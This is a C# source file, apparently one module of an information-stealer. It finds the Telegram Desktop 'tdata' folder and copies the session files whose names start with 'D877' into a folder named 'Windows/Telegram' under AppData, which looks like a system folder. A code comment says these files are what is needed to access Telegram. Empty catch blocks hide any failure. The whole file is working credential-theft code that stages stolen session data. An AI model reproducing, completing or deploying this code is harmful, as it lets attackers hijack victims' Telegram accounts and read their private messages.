using System;
using System.IO;

namespace tdata
{
    class telegram
    {
        public static bool telegramData()
        {
            try
            {
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Telegram Desktop/tdata")) //checking tdata dir
                {
                    try
                    {
                        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Telegram"); // creating new our dir
                        string[] tdatadir = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Telegram Desktop/tdata");  // getting  all files in tdata folder
                        for (int i = 0; i < tdatadir.Length; i++)
                        {
                            if (tdatadir[i].StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Telegram Desktop/tdata\D877"))
                            {
                                FileInfo D877 = new FileInfo(tdatadir[i]);
                                D877.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Telegram/" + Path.GetFileName(tdatadir[i]));//taking file, startswith D877(need to acess telegram)
                            }
                        }
                    }
                    catch
                    {
                    }
                    try
                    {
                        string[] tdatadir2 = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Telegram Desktop/tdata"); // getting all dirs in tdata
                        for (int i = 0; i < tdatadir2.Length; i++)
                        {
                            string dirName = new DirectoryInfo(tdatadir2[i]).Name;
                            if (tdatadir2[i].StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Telegram Desktop/tdata\D877"))
                            {
                                string[] tdataD877dir = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Telegram Desktop/tdata\" + dirName);
                                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Telegram\" + dirName);
                                for (int ii = 0; ii < tdataD877dir.Length; ii++)
                                {
                                    FileInfo D877dir_files = new FileInfo(tdataD877dir[ii]);
                                    D877dir_files.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Telegram/" + dirName + @"\" + Path.GetFileName(tdataD877dir[ii]));
                                }

                            }
                        }
                    }
                    catch
                    {
                    }

                    return true;
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
    }
}
